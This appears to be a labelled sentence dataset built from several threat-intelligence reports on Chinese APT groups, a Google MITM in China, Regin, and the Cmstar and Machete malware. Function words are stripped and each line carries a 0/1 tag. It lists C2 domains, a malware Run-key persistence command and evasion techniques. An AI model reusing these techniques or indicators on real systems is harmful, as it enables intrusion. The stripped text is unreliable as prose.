Of note company hired notorious hacker Lin Yong a.k.a	0
" Lion " ( Honker Union China[59 ] ) early 2000s security service engineer conduct network training	0
Section Summary It surprising Chinese government would interested partnering private organization Beijing Topsec use front state - sponsored activity	0
The association Southeast University Beijing Topsec manifested joint information security research center highlights possibility growing links state - sponsored activity academic institutions particularly receive funding central government	0
All would seem China pursuing uni�ed approach cyber operations relying unique facets workforce academia private industry independent hackers well PLA achieve strategic goals	0
The Anthem breach exposes insidious reality modern Chinese cyber espionage continues unrelenting strikes soft underbelly American way life	0
Moreover demonstrates imposing yet increasingly common reality conducting threat intelligence analysis without substantial threat intelligence start	0
Fortunately us able deduce informed answers outstanding questions breach scrutinizing archival data troves ef�ciently stored within Threat Intelligence Platform partner integrations	0
In �eld cyber security industry professionals must learn play long game order generate proactive sense situational awareness allowing greater ef�ciency �exibility mitigating future threats	0
Additionally incident underscores frustrating disparity industry comes naming conventions	0
With many threat actors indicators �oating around frustrating keep track disparate pieces evidence especially countless naming conventions applied	0
Without use Threat Intelligence Platform keep track �ood incoming threat data task would extraordinarily time consuming best crippling worst	0
Moving forward important bear mind adversary regardless country origin shall almost certainly leverage every weakness us	0
Even something seemingly innocuous confusion names easily consume analytical bandwidth creating window opportunity strike	0
We – security professionals private industry governments alike – must proactively harden network defenses hasten incident responses united synchronous entity	0
We shared details Song Yubo[60 ] af�liated indicators within ThreatConnect Common Community	0
This share also includes full - text DGI " BLUE HERON " research[61 ] provides greater insight Song Yubo Southeast University Beijing Topsec	0
All things considered industry must learn adopt cooperative defense mindset hopes rebuf�ng future attacks	0
The resolute defense like TCIRT start actively defending community next big breach	0
Register free ThreatConnect account today[62 ] get started sharing analyzing threat intelligence	0
Thursday 04 September 2014 23:55:00 ( UTC / GMT ) The Chinese running MITM attack SSL encrypted traffic Chinese universities Google	1
We 've performed technical analysis attack request GreatFire.org confirm real SSL MITM www.google.com performed within China	0
We contacted GreatFire.org yesterday ( September 3 ) request analyze two packet captures suspected MITM - attacks finalized blog post	0
The conclusions analysis published part GreatFire.org 's great blog post titled " Authorities launch man - - the- middle attack Google "	0
In blog post GreatFire.org write	0
From August 28 2014 reports appeared Weibo Google Plus users China trying access google.com google.com.hk via CERNET country 's education network receiving warning messages invalid SSL certificates	0
The evidence include later post indicates caused man - - - middle attack	0
While authorities blocking access things Google since June 4th kept hands CERNET China 's nationwide education research network	0
However lead new school year Chinese authorities launched man - - - middle ( MITM ) attack Google	0
Our network forensic analysis performed investigating following packet capture files	0
The analyzed capture files contain pure IPv6 traffic ( CERNET IPv6 network ) made analysis bit different usual	0
We disclose client IP addresses privacy reasons seem legit ; one Peking University ( netname PKU6-CERNET2 ) Chongqing University ( CQU6-CERNET2 )	0
Both IP addresses belong AS23910 named " China Next Generation Internet CERNET2 "	0
The IP addresses received www.google.com cases also legit MITM n't carried DNS spoofing	0
The Peking University client connected 2607:f8b0:4007:804::1013 ( GOOGLE - IPV6 United States ) connection Chongqing University went 2404:6800:4005:805::1010 ( GOOGLE_IPV6_AP-20080930 Australia )	0
The Time - To - Live ( TTL ) values received IP packets www.google.com cases 248 249 ( note TTL actually called " Hop Limit " IPv6 nomenclature prefer use well established term " TTL " anyway )	0
The highest possible TTL value 255 means received packets made 6 7 router hops ending client	0
However expected number router hops server GOOGLE - IPV6 client Peking University around 14	0
The low number router hops clear indication IP MITM taking place	0
Here IPv6 traceroute AS25795 Los Angeles towards IP address Peking University ( generated ARP Networks ' 4or6.com tool )	0
# traceroute -6 2001:da8:[REDACTED ] 1 2607:f2f8:1600::1 ( 2607:f2f8:1600::1 ) 1.636 ms 1.573 ms 1.557 ms 2 2001:504:13::1a ( 2001:504:13::1a ) 40.381 ms 40.481 ms 40.565 ms 3 * * * 4 2001:252:0:302::1 ( 2001:252:0:302::1 ) 148.409 ms 148.501 ms 148.595 ms 5 * * * 6 2001:252:0:1::1 ( 2001:252:0:1::1 ) 148.273 ms 147.620 ms 147.596 ms 7 pku-bj-v6.cernet2.net ( 2001:da8:1:1b::2 ) 147.574 ms 147.619 ms 147.420 ms 8 2001:da8:1:50d::2 ( 2001:da8:1:50d::2 ) 148.582 ms 148.670 ms 148.979 ms 9 cernet2.net ( 2001:da8:ac ffff::2 ) 147.963 ms 147.956 ms 147.988 ms 10 2001:da8:[REDACTED ] 147.964 ms 148.035 ms 147.895 ms 11 2001:da8:[REDACTED ] 147.832 ms 147.881 ms 147.836 ms 12 2001:da8:[REDACTED ] 147.809 ms 147.707 ms 147.899 ms As seen traceroute seven hops client find 2001:252::/32 network called " CNGI International Gateway Network ( CNGIIGN ) "	0
This network actually part CERNET AS23911 network connects CERNET external peers	0
A reasonable assumption therefore MITM carried 2001:252::/32 network AS23910 ( 2001:da8:1::2 ) connects AS23911 ( 2001:252:0:1::1 )	1
This means MITM attack conducted within China	0
The round - trip time client server estimated measuring time client sends initial TCP SYN packet receives TCP SYN+ACK server	0
The expected round - trip time connecting CERNET Google server overseas would around 150ms	0
However captures 've analyzed TCP SYN+ACK package received 8ms ( Peking ) 52ms ( Chongqing ) respectively	0
Again clear indication IP MITM taking place since Google possibly send response US CERNET within 8ms regardless fast	1
The fast response times also indicate machine performing MITM located fairly close network Peking University	0
Even though machine performing MITM quick performing TCP tree - way handshake noticed application layer communication terribly slow	0
The specification TLS handshake ( RFC 2246 ) defines ClientHello message responded ServerHello	0
Google typically send ServerHello response almost instantly i.e.	0
response received one round - trip time ( 150ms case )	0
However analyzed captures noticed ServerHello response times around 500ms	0
We extracted X.509 certificates two capture files .cer files using NetworkMiner	0
We noticed users received identical certificates self signed " google.com "	0
The fact MITM used self signed certificate makes attack easily detectable even non- technical user since web browser typically display warning site trusted	0
Additionally X.509 certificate created " google.com " rather " * .google.com "	0
This obvious miss MITM'ers side since attempting MITM traffic " www.google.com " " google.com "	0
Certificate SHA1 fingerprint f6beadb9bc02e0a152d71c318739cdecfc1c085d Certificate MD5 fingerprint 66:D5:D5:6A E9:28:51:7C:03:53:C5:E1:33:14:A8:3B A copy fake certificate available Google drive thanks GreatFire.org	0
All evidence indicates MITM attack conducted traffic China 's nationwide education research network CERNET www.google.com	1
It looks MITM carried network belonging AS23911 outer part CERNET peers external networks	0
This network located China conclude MITM done within country	0
It 's difficult say exactly MITM attack carried dismiss DNS spoofing used method	0
The evidence 've observed instead indicate MITM attack performed either performing IP hijacking simply reconfiguring router forward HTTPS traffic transparent SSL proxy	1
An alternative changing router config would also add - line device redirects desired traffic SSL proxy	0
However regardless attacker would able decrypt inspect traffic going Google	0
We also conclude method used perform MITM attack similar Chinese MITM GitHub identical	0
Share | Short URL http://netresec.com/?b=14955CB Posted Erik Hjelmvik Thursday 04 September 2014 23:55:00 ( UTC / GMT )	0
In mid - July year noticed yet another legitimate website compromised APT actors serving malware	0
In case group commonly referred " Nitro " coined Symantec 2011 whitepaper	0
As dug deeper found additional compromised legitimate websites malware group back March year	0
In instances malware one commonly referred " Spindest " though also found " PCClient " " Farfli " variants use group	0
We n't enough data say certain malware blog delivered via compromised legitimate websites	0
Historically Nitro known targeted spear phishing campaigns using Poison Ivy malware seen attacks	0
Since least 2013 Nitro appears somewhat modified malware delivery methods include Spindest legitimate compromised websites reported Cyber Squared 's TCIRT	0
Our findings indicate continuing evolve addition PCClient Farfli variants	0
The Maltego screenshot shows activity describe blog	0
These events impacted least following industries across four waves	0
A US based IT Solutions provider ; The European office major US based commercial vendor space imagery geospatial content ; A European leader power technologies automation utilities industry ; A US based provider medical dental imaging systems IT solutions	0
In July Nitro compromised South Korean clothing accessories manufacturer 's website serve malware commonly referred " Spindest " Of samples 've tied activity far noted blog one configured connect directly IP address Command Control ( C2 )	0
This IP address use group time interesting since evolved components kill chain time ensure malware delivery oddly altered C2 infrastructure	0
It simple companies block outbound traffic IP would negate effort Nitro put successfully delivering malware	0
37 AV vendors within VirusTotal properly identify PE timestamp shows day saw	0
In addition following three samples found roughly week apart possibly indicating timing waves activity	0
Table 1 The next sample found commonly known PCClient malware previously tied group	0
We discovered many following samples historic IP resolution overlap domains alternately resolving either 223.25.233.248 196.45.144.12	0
The second IP also reported tied group	0
However shifting IP resolutions back forth indicates Nitro control domains	0
It also makes fairly easy Infosec team reach conclusion negates use previously unreported domain IP C2 well new family malware	0
25 AV vendors within VirusTotal properly classify sample malware	0
Its PE timestamp 8 July almost week prior first saw	0
Table 2 The next sample another Spindest variant timestamp aforementioned PcClient sample	0
In addition Nitro chose use C2 sample making easy find tie group	0
41 AV vendors within VirusTotal properly classify sample malware	0
Table 3 The next wave activity found took place mid - May	0
Both samples Spindest variants PE timestamp 15 May.	0
While neither MD5s C2 match aforementioned link post Cyber Squared 's TCIRT document Nitro using Spindest variants file name starting late December last year	0
In case used historic C2 IP note Table 1 blog	0
34 AV vendors within VirusTotal properly classify first sample malware 40 AV Vendors second sample	0
Table 4 Table 5 The malware dropped configured use good.myftp[.]org C2 URL IP resolution 223.25.233.248	1
Both known Nitro Indicators Compromise ( IOCs )	0
In case malware Farfli variant malware previously tied group	0
39 AV vendors within VirusTotal properly identify file malware	0
The PE timestamp file 1 April two weeks saw file	0
Continuing activity discovered actors compromised legitimate website belonging international technology company provides Software Configuration Change Management ( SCCM ) solutions mid - May	0
( It well regarded company partners large companies Microsoft ) Table 6 The final sample mid - March also hosted compromised legitimate website time small US based IT company	0
The IP resolved C2 URL changed two days saw file overlap good.myftp[.]org month returning resolution	0
The filename matches sample Table 5 similar third level C2 domain IP resolution	0
This also Spindest variant PE timestamp day saw	0
39 AV vendors within VirusTotal properly identify file malware	0
Table 7 As post previous cited research show APT groups Nitro continue evolve techniques within kill chain avoid detection	1
However also demonstrate value tracking threats time allowed us uncover properly attribute new IOCs Nitro still - using old C2 infrastructure new malware	1
For Palo Alto Networks customers files properly identified WildFire malware C2 domains labeled threats Threat Prevention URL Filtering systems	0
Complex malware known Regin suspected technology behind sophisticated cyberattacks conducted U.S. British intelligence agencies European Union Belgian telecommunications company according security industry sources technical analysis conducted The Intercept	0
Regin found infected internal computer systems email servers Belgacom partly state-owned Belgian phone internet provider following reports last year company targeted top-secret surveillance operation carried British spy agency Government Communications Headquarters industry sources told The Intercept	1
The malware steals data infected systems disguises legitimate Microsoft software also identified European Union computer systems targeted surveillance National Security Agency	1
The hacking operations Belgacom European Union first revealed last year documents leaked NSA whistleblower Edward Snowden	0
The specific malware used attacks never disclosed however	0
The Regin malware whose existence first reported security firm Symantec Sunday among sophisticated ever discovered researchers	0
Symantec compared Regin Stuxnet state-sponsored malware program developed U.S. Israel sabotage computers Iranian nuclear facility	0
Sources familiar internal investigations Belgacom European Union confirmed The Intercept Regin malware found systems compromised linking spy tool secret GCHQ NSA operations	0
Ronald Prins security expert whose company Fox IT hired remove malware Belgacom 's networks told The Intercept '' sophisticated malware '' ever studied	0
'' Having analyzed malware looked [ previously published ] Snowden documents '' Prins said '' I 'm convinced Regin used British American intelligence services	0
'' A spokesman Belgacom declined comment specifically Regin revelations said company shared '' every element attack '' federal prosecutor Belgium conducting criminal investigation intrusion	0
'' It 's impossible us comment '' said Jan Margot spokesman Belgacom	0
'' It 's always clear us malware highly sophisticated ever since clean-up whole story belongs past us	0
'' In hacking mission codenamed Operation Socialist GCHQ gained access Belgacom 's internal systems 2010 targeting engineers company	1
The agency secretly installed so-called malware '' implants '' employees ' computers sending internet connection fake LinkedIn page	0
The malicious LinkedIn page launched malware attack infecting employees ' computers giving spies total control systems allowing GCHQ get deep inside Belgacom 's networks steal data	1
The implants allowed GCHQ conduct surveillance internal Belgacom company communications gave British spies ability gather data company 's network customers include European Commission European Parliament European Council	1
The software implants used case part suite malware known Regin	0
One keys Regin stealth To avoid detection frustrate analysis malware used operations frequently adhere modular design	1
This involves deployment malware stages making difficult analyze mitigating certain risks caught	0
Based analysis malware samples Regin appears developed course decade ; The Intercept identified traces components dating back far 2003	0
Regin mentioned recent Hack.lu conference Luxembourg Symantec 's report Sunday said firm identified Regin infected systems operated private companies government entities research institutes countries Russia Saudi Arabia Mexico Ireland Belgium Iran	0
The use hacking techniques malware state-sponsored espionage publicly documented last years China linked extensive cyber espionage recently Russian government also alleged behind cyber attack White House	0
Regin demonstrates Western intelligence agencies also involved covert cyberespionage	0
GCHQ declined comment story	0
The agency issued standard response inquiries saying '' longstanding policy comment intelligence matters '' '' GCHQ 's work carried accordance strict legal policy framework ensures activities authorised necessary proportionate	0
'' The NSA said statement '' We going comment The Intercept 's speculation	0
'' The Intercept obtained samples malware sources security community making available public download effort encourage research analysis	0
( To download malware click	0
The file encrypted ; access machine use password '' infected	0
'' ) What follows brief technical analysis Regin conducted The Intercept 's computer security staff	0
Regin extremely complex multi-faceted piece work means definitive analysis	0
In coming weeks The Intercept publish details Regin infiltration Belgacom part investigation partnership Belgian Dutch newspapers De Standaard NRC Handelsblad	0
In Nordic mythology name Regin associated violent dwarf corrupted greed	0
It unclear Regin malware first got name name appeared first time VirusTotal website March 9th 2011	0
Der Spiegel reported according Snowden documents computer networks European Union infiltrated NSA months first discovery Regin	0
Industry sources familiar European Parliament intrusion told The Intercept attacks conducted use Regin provided samples code	0
This discovery sources said may brought Regin wider attention security vendors	0
Also March 9th 2011 Microsoft added related entries Malware Encyclopedia Two variants Regin added Encyclopedia Regin.B Regin.C	0
Microsoft appears detect 64-bit variants Regin Prax.A Prax.B	0
None Regin/Prax entries provided sort summary technical information	0
The following Regin components identified The first stage drivers act loaders second stage	1
They encrypted block points location 2nd stage payload	0
On NTFS Extended Attribute Stream ; FAT use registry store body	0
When started stage simply loads executes Stage 2	1
The Regin loaders disguised Microsoft drivers names Mimicking Microsoft drivers allows loaders better disguise presence system appear less suspicious host intrusion detection systems	1
When launched cleans traces initial loader loads next part toolkit monitors execution	1
On failure Stage 2 able disinfect compromised device	1
The malware zeroes PE ( Portable Executable Windows executable format ) headers memory replacing '' MZ '' magic marker 0xfedcbafe	1
This component consists service orchestrator working Windows ' kernel	0
It initializes core components architecture loads next parts malware	1
This stage composed service orchestrator located user land provided many modules loaded dynamically needed	0
These modules include data collectors self-defense engine detects attempts detect toolkit occur functionality encrypted communications network capture programs remote controllers different kinds	1
The Intercept 's investigation revealed sample uploaded VirusTotal March 14th 2012 presents unique 0xfedcbafe header sign might loaded Regin driver appears provide stealth functionality tool kit	1
In order access information stored computer 's memory programs use objects reference specific locations memory called pointers	1
This binary file contains pointers initialized corroborates hypothesis file dumped memory forensic analysis compromised system	1
The sample following SHA256 hash This sample gives sense sophistication actors length precautions taking order operate stealthily possible	0
When Windows kernel driver needs allocate memory store type data creates called kernel pools	0
Such memory allocations specific headers tags used identify type objects contained within block	0
For example tags could Proc Thrd File respectively indicate given block would contain process thread file object structure	0
When performing forensic analysis computer 's memory common use technique called pool scanning parse kernel memory enumerate kernel pools identify type content extract	0
Just like Regin loader drivers driver repeatedly uses generic '' Ddk '' tag ExAllocatePoolWithTag ( ) allocating kernel pools The generic tag used throughout operating system proper tag specified	0
This makes difficult forensic analysts find useful information pool scanning since memory allocations mix many generic others	0
In addition freeing memory using ExFreePool ( ) driver zeroes content probably avoid leaving traces pool memory	1
The driver also contains routines check specific builds Windows kernel use including old versions Windows NT4 Terminal Server Windows 2000 adapts behavior accordingly	1
Windows kernel drivers operate different levels priority lowest PASSIVELEVEL highest HIGHLEVEL	0
This level used processor know service give execution priority make sure system n't try allocate used resources could result crash	0
This Regin driver recurrently checks current IRQL ( Interrupt Request Level ) set PASSIVELEVEL using KeGetCurrentIrql ( ) function many parts code probably order operate silently possible prevent possible IRQL confusion	1
This technique another example level precaution developers took designing malware framework	0
Upon execution unload routine ( located 0xFDEFA04A ) driver performs long sequence steps remove remaining traces artifacts	1
In interview given Belgian magazine MondiaalNiews Fabrice Clément head security Belgacom said company first identified attack June 21 2013	0
In interview Clément says computers targeted attackers included staff workstations well email servers	0
These statements confirm timing techniques used attack	0
From previously identified Regin samples The Intercept developed unique signatures could identify toolkit	0
A zip archive sample identified Regin/Prax found VirusTotal free online website allows people submit files scanned several anti-virus products	0
The zip archive submitted 2013-06-21 07:58:37 UTC Belgium date identified Clément	0
Sources familiar Belgacom intrusion told The Intercept sample uploaded systems administrator company discovered malware uploaded attempt research type malware	0
The archive contains Along files The Intercept found output forensic tool GetThis run target systems looking malware	0
From content GetThis.log file see sample called '' svcsstat.exe '' located C \Windows\System32\ collected copy stored	0
The malware question '' 0001000000000C1Csvcsstat.exesample ''	0
This 64bit variant first stage Regin loader aforementioned	0
The archive also contains output ProcMon '' Process Monitor '' system monitoring tool distributed Microsoft commonly used forensics intrusion analysis	0
This file identifies infected system provides variety interesting information network	0
For instance The following environment variable shows system provided Microsoft SQL server Microsoft Exchange server indicating might one compromised corporate mail server Fabrice Clément mentioned Mondiaal News Below list hashes files The Intercept making available download	0
Given year since Belgacom operation publicly outed The Intercept considers likely GCHQ/NSA replaced toolkit current operations affected publication samples	0
In recent weeks Unit 42 analyzing delivery documents used spear - phishing attacks drop custom downloader used cyber espionage attacks	1
This specific downloader Cmstar associated Lurid downloader also known ' Enfal '	0
Cmstar named log message ' CM * * ' used downloader	0
Unit 42 aware threat actors using two toolkits – MNKit Tran Duy Linh toolkit – produce malicious documents exploit CVE-2012 - 0158 order implant Cmstar	0
The Cmstar downloader several unique interesting features well substantial infrastructure overlap tools worth discussing	0
The Cmstar downloader starts manually building import address table ( IAT ) much like shellcode would ; however uses rather unique technique	0
Instead finding API function names based hashed values malware enumerates libraries ' export address table ( EAT ) searches name API function payload needs load using character offset array	1
The payload pairs several comma - separated lists characters comma - separated lists numbers	0
Each list characters consists set found within API function name payload seeks add IAT corresponding list numbers specifies offset function name characters placed	0
For example payload " D e A " paired " 0,5,19 " results following mapping	0
The payload loads specific Windows library 's EAT calling ImageDirectoryEntryToData API function using IMAGE_DIRECTORY_ENTRY_EXPORT flag	0
It enumerates library 's EAT find exported function names checking function name character specific offset	0
Once found payload adds address specific API function IAT	0
For instance payload checks EAT " wininet.dll " using comparisons mentioned find address " DeleteUrlCacheEntryA " API function	0
One specific Cmstar payload analyzed used character / offsets seen Figure 1 locate API functions within three different Windows libraries build IAT	0
After manually creating IAT Cmstar decrypts configuration several encrypted strings piece shellcode	0
The embedded configuration contains nothing URL Cmstar uses command control ( C2 ) location	1
The encrypted strings within Trojan include fields used within HTTP requests Cmstar create communicate C2 server well additional strings used interact registry	1
The Cmstar sample associated MNKIT delivery document creates following registry key automatically execute system startup	1
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\xpsfiltsvcs " rundll32.exe C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\xpsfiltsvcs.dll XpsRegisterServer " Unit 42 found additional encrypted registry key would allow Cmstar automatically start reboots	0
However code decrypt reference use following registry key way suggests malware author left artifact code swapping run key listed	0
HKCU\Software\Microsoft\CTF\LangBarAddIn Cmstar also decrypts 752-byte piece shellcode carries communications C2 server specifically sending HTTP POST requests following URL	1
http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi It noted C2 URL contains string ' cgl - bin ' visually resembles common cgi- bin folder used many webservers run server - side scripts	0
Unit 42 used Palo Alto Networks AutoFocus threat intelligence service locate additional samples using ' cgl - bin ' string within URLs HTTP requests found several samples Cmwhite tool associated LURID / Enfal downloader1 seen Figure 2	0
Cmstar 's HTTP POST requests sent ' happy.launchtrue[.]com ' contain data Trojan gathers infected machine following structure	1
Windows Version number>@@<CPU Architecture ( 2 x64 1 x86)>??<boolean elevated privileges>]]**<boolean antivirus processes found>!!<static version string>== In one example Unit 42 observed following data within analysis environment encrypted using single - byte XOR algorithm key 0x45 sent C2 server	0
510@@1??1]]**0!!150316o== Helpfully malware author writes log messages ' DF64159.TMP ' file used debugging purposes throughout execution Cmstar downloader	1
The log messages abbreviated strings describe specific activities execution code	0
For instance downloader uses CreateMutex create mutex named ' { 53A4988C - F91F-4054 - 9076 - 220AC5EC03F3 } ' determine another instance code running	0
If downloader determines another instance running code writes string ' CM * * ' – happens basis name Trojan – log file	0
Unit 42 created Yara signature detect Cmstar samples based debugging strings available appendix	0
As mentioned behavioral analysis section Cmstar downloader gathers system - specific information send C2 server	1
One piece information existence specific running processes	0
Many malware families tools check existence antivirus Cmstar tool clever way	0
Rather including list strings associated processes Cmstar enumerates running processes subjects process names hashing algorithm	0
The results algorithm compared three static values 0x1E00AFA 0xBEE091E8 0xD46FCDFA	0
Unit 42 reverse engineered algorithm created function seen generate hashes order determine processes Cmstar trying find	0
Unit 42 found string ' avp ' subjected algorithm results value 0x1E00AFA suggests Cmstar sample specifically looks Kaspersky 's Anti - virus product ( avp.exe ) running compromised system	1
If Trojan finds processes whose hash matches three values mentioned earlier sets boolean value ( character ' 1 ' ) within data sent C2 server continues carrying functionality	0
Rather altering activities Cmstar notifies C2 server system running one processes suggesting threat actors might employ technique filtering mechanism ignore analysis systems researchers	0
In order determine intrusion set involved Cmstar Unit 42 enumerated infrastructure used downloader C2 servers	0
The related infrastructure chart Figure 3 shows rather large cluster related entities one small set entities share related entities larger cluster	0
As seen chart C2 domain ' happy.launchtrue[.]com ' originally registered using email address ' WANGMINGHUA6@GMAIL[.]COM '	0
When Unit 42 used Palo Alto Networks AutoFocus threat intelligence service locate additional Cmstar samples found several C2 domains also original registrant	0
The known Cmstar C2 domain initially registered email address help.ubxpi0s[.]com	0
Further analysis revealed additional domains related Cmstar C2 domains also originally registered using email address ' WANGMINGHUA6@GMAIL[.]COM ' updated current information within days	0
In addition original registrant C2 domain used Google Code blog2 indicating registrant email likely - seller and/or someone initially sets infrastructure particular APT threat actors	0
The rest domains related Cmstar infrastructure use original registrant noted instead kept information initially used register	0
The difference domain registration patterns could indicate threat actor preference could indicate least two groups using malware whose infrastructure times overlaps	0
Interestingly updated registrant information ( original cases n't changed ) C2 domains blog also used register scam sites purporting sell knock - designer products like shoes software cell phones	0
The contact emails contact names vary address - used	0
Blue Coat noted pattern well blog published late last year also noted ' WANGMINGHUA6@GMAIL[.]COM ' registrant email.3 It known whether threat actors conducting malicious activity also behind scam sites	0
The Cmstar tool several interesting features including previously unseen method manually creating import address table using API function name character offset mapping techniques hashing algorithm used find antivirus processes infected system	1
Both features noteworthy may provide ability correlate future tools group and/or malware authors	0
The URL used Cmstar communicate C2 server well significant infrastructure overlap show direct relationship Cmstar downloader Lurid / Enfal Cmwhite tools	0
In majority cases threat actors using Cmstar downloader initially register C2 domains using email address ' WANGMINGHUA6@GMAIL[.]COM ' later change registration information include different email address	0
Unit 42 positively confirm threat actors control ' WANGMINGHUA6@GMAIL[.]COM ' email address email address belongs reseller threat actors buy domains create infrastructure ; however believe interesting TTP worth tracking future infrastructure enumeration	0
Known Cmstar Downloaders Delivery Documents Installing Cmstar	0
The attackers referred APT12 ( also known IXESHE DynCalc DNSCALC ) recently started new campaign targeting organizations Japan Taiwan	0
APT12 believed cyber espionage group thought links Chinese People 's Liberation Army	0
APT12′s targets consistent larger People 's Republic China ( PRC ) goals	0
Intrusions campaigns conducted group in- line PRC goals self - interest Taiwan	0
Additionally new campaigns uncovered highlight correlation APT groups ceasing retooling operations media exposure APT12 used strategy compromising New York Times Oct 2012	0
Much like Darwin 's theory biological evolution APT12 forced evolve adapt order maintain mission	0
The new campaign marks first APT12 activity publicly reported since Arbor Networks released blog " Illuminating The Etumbot APT Backdoor " FireEye refers Etumbot backdoor RIPTIDE	0
Since release Arbor blog post FireEye observed APT12 use modified RIPTIDE backdoor call HIGHTIDE	0
This second time FireEye discovered APT12 retooling public disclosure	0
As FireEye believes common theme APT group APT12 continue evolve effort avoid detection continue cyber operations	0
FireEye researchers also discovered two possibly related campaigns utilizing two backdoors known THREEBYTE WATERSPOUT	0
Both backdoors dropped malicious documents built utilizing " Tran Duy Linh " exploit kit exploited CVE-2012 - 0158	1
These documents also emailed organizations Japan Taiwan	0
While APT12 previously used THREEBYTE unclear APT12 responsible recently discovered campaign utilizing THREEBYTE	0
Similarly WATERSPOUT newly discovered backdoor threat actors behind campaign positively identified	0
However WATERSPOUT campaign shared several traits RIPTIDE HIGHTIDE campaign attributed APT12	0
From October 2012 May 2014 FireEye observed APT12 utilizing RIPTIDE proxy - aware backdoor communicates via HTTP hard - coded command control ( C2 ) server	1
RIPTIDE 's first communication C2 server fetches encryption key RC4 encryption key used encrypt communication	0
In June 2014 Arbor Networks published article describing RIPTIDE backdoor C2 infrastructure great depth	0
The blog highlighted backdoor utilized campaigns March 2011 till May 2014	0
Following release article FireEye observed distinct change RIPTIDE 's protocols strings	0
We suspect change direct result Arbor blog post order decrease detection RIPTIDE security vendors	1
The changes RIPTIDE significant enough circumvent existing RIPTIDE detection rules	0
FireEye dubbed new malware family HIGHTIDE	0
On Sunday August 24 2014 observed spear phish email sent Taiwanese government ministry	1
Attached email malicious Microsoft Word document ( MD5 f6fafb7c30b1114befc93f39d0698560 ) exploited CVE-2012 - 0158	0
It worth noting email appeared sent another Taiwanese Government employee implying email sent valid compromised account	0
The exploit document dropped HIGHTIDE backdoor following properties	1
The HIGHTIDE backdoor connected directly 141.108.2.157	0
If compare HTTP GET request RIPTIDE samples ( Figure 1 ) HTTP GET request HIGHTIDE samples ( Figure 3 ) see malware author changed following items	0
User Agent Format structure HTTP Uniform Resource Identifier ( URI ) Similar RIPTIDE campaigns APT12 infects target systems HIGHTIDE using Microsoft Word ( .doc ) document exploits CVE-2012 - 0158	0
FireEye observed APT12 deliver exploit documents via phishing emails multiple cases	1
Based past APT12 activity expect threat group continue utilize phishing malware delivery method	1
When file opened drops HIGHTIDE form executable file onto infected system	1
RIPTIDE HIGHTIDE differ several points executable file location image base address User- Agent within GET requests format URI	0
The RIPTIDE exploit document drops executable file C:\Documents Settings\{user}\Application Data\Location folder HIGHTIDE exploit document drops executable file C:\DOCUMENTS SETTINGS\ { user}\LOCAL SETTINGS\Temp\ folder	1
All one sample identified written folder word.exe	0
The one outlier written winword.exe	0
Research HIGHTIDE campaign revealed APT12 targeted multiple Taiwanese Government organizations August 22 28	0
On Monday August 25 2014 observed different spear phish email sent lilywang823@gmail.com technology company located Taiwan	1
This spear phish contained malicious Word document exploited CVE-2012 - 0158	1
The MD5 exploit document e009b95ff7b69cbbebc538b2c5728b11	0
Similar newly discovered HIGHTIDE samples documented malicious document dropped backdoor C:\DOCUMENTS SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe	1
This backdoor following properties	0
This backdoor sent following callback traffic video[.]csmcpr[.]com	0
The THREEBYTE spear phishing incident ( yet attributed ) shared following characteristics HIGHTIDE campaign attributed APT12	0
On August 25 2014 observed another round spear phishing emails targeting high - technology company Japan	1
Attached email another malicious document designed exploit CVE-2012 - 0158	1
This malicious Word document MD5 499bec15ac83f2c8998f03917b63652e dropped backdoor C:\DOCUMENTS SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe	1
The backdoor following properties	0
The backdoor connects command control server icc[.]ignorelist[.]com	0
Similar RIPTIDE HIGHTIDE WATERSPOUT backdoor HTTP - based backdoor communicates C2 server	1
Although current infrastructure ties link backdoor APT12 several data points show possible tie actors	0
Although points definitively tie WATERSPOUT APT12 indicate possible connection WATERSPOUT campaign THREEBYTE campaign HIGHTIDE campaign attributed APT12	0
FireEye believes change RIPTIDE HIGHTIDE represents temporary tool shift decrease malware detection APT12 developed completely new malware toolset	0
These development efforts may resulted emergence WATERSPOUT backdoor	0
APT12 's adaptations public disclosures lead FireEye make several conclusions threat group	0
Though public disclosures resulted APT12 adaptations FireEye observed brief pause APT12 activity threat actors returned normal activity levels	0
Similarly public disclosure APT12 's intrusion New York Times also led brief pause threat group 's activity immediate changes TTPs	0
The pause retooling APT12 covered Mandiant 2014 M- Trends report	0
Currently APT12 continues target organizations conduct cyber operations using new tools	0
Most recently FireEye observed HIGHTIDE multiple Taiwan - based organizations suspected APT12 WATERSPOUT backdoor Japan - based electronics company	0
We expect APT12 continue trend evolve change tactics stay ahead network defenders	0
Note IOCs campaign found	0
This entry posted Botnets Targeted Attack Threat Intelligence Threat Research tagged advanced malware advanced persistent threat advanced targeted attack advanced threat actor APT12 Targeted Attack Ned Moran Mike Oppenheim Sarah Engle Richard Wartell	0
Bookmark permalink	0
Some time ago Kaspersky Lab customer Latin America contacted us say visited China suspected machine infected unknown undetected malware	0
While assisting customer found interesting file system completely unrelated China contained Chinese coding traces	0
At first look pretends Java related application quick analysis obvious something simple Java file	0
It targeted attack calling " Machete "	0
" Machete " targeted attack campaign Spanish speaking roots	0
We believe campaign started 2010 renewed improved infrastructure 2012	0
The operation may still " active "	0
The malware capable following cyber - espionage operations	1
Most victims located Venezuela Ecuador Colombia Peru Russia Cuba Spain among others	0
In cases Russia target appears embassy one countries list	0
Targets include high - level profiles including intelligence services military embassies government institutions	0
The malware distributed via social engineering techniques includes spear - phishing emails infections via Web fake Blog website	1
We found evidence exploits targeting zero - day vulnerabilities	0
Both attackers victims appear Spanish - speaking	0
During investigation also discovered many files installing cyber - espionage tool appears dedicated spear phishing campaign	1
These files display PowerPoint presentation installs malware target system file opened	0
These names PowerPoint attachments	0
These files reality Nullsoft Installer self - extracting archives compilation dates going back 2008	0
A consequence embedded Python code inside executables installers include necessary Python libraries well PowerPoint file shown victim installation	0
The result extremely large files 3 MB	0
Here screnshots mentioned files	0
A technical relevant fact campaign use Python embedded Windows executables malware	0
This unusual advantage attackers except ease coding	0
There multi - platform support code heavily Windows - oriented ( use libraries )	0
However discovered several clues attackers prepared infrastructure Mac OS X Unix victims well	0
In addition Windows components also found mobile ( Android ) component	0
Both attackers victims speak Spanish natively see consistently source code client side Python code	0
The following code snippets found HTML websites used infect victims	0
Note Thanks Tyler Hudak Korelogic noticed HTML copy pasted SET The Social Engineering Toolkit	0
Also following link one known infection artifact	0
hxxp://name.domain.org / nickname / set / Signed_Update.jar The following domains found infection campaign	0
